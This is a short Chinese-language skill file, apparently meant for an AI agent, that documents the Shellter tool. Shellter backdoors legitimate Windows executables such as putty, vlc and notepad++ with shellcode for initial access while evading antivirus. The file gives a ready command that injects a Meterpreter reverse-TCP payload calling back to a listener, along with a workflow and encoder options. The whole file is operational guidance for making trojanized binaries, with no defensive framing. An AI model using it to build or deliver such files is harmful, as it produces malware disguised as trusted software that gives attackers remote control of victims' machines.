---
name: shellter
description: >
  此技能适用于用户询问关于"shellter"、"将合法 PE 文件（putty、vlc、notepad++）木马化以植入自定义 Shellcode 载荷用于初始访问"。动态 Shellcode 注入工具，在保留原始功能的同时后门化原生 Windows PE 可执行文件，以规避 AV 检测。
---

# Shellter

将 Shellcode 动态注入合法 PE 文件。

## 快速开始

```bash
# 交互模式（Windows 或 Linux 上的 Wine）
shellter.exe

# 自动模式
wine shellter.exe -a -f putty.exe -p windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444
```

## 工作流程

1. 选择合法的 PE 目标文件（putty.exe、vlc.exe、notepad++.exe）
2. Shellter 分析执行流，识别注入点
3. 选择 MSF 载荷或提供自定义 Shellcode 字节
4. Shellter 注入并输出修改后的 PE 文件
5. 原始功能保留 — 降低 AV 特征匹配概率

## 运行模式

| 模式 | 参数 | 用途 |
|------|------|------|
| 自动 | `-a` | 非交互式，速度最快 |
| 手动 | （交互式） | 完全控制注入点 |

## 关键选项（自动模式）

| 参数 | 用途 |
|------|------|
| `-f <pe>` | 目标 PE 文件 |
| `-p <payload>` | MSF 载荷字符串 |
| `--lhost / --lport` | 监听地址 |
| `-e <encoder>` | MSF 编码器 |

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/` | 自定义 Shellcode 注入与编码器选择 |
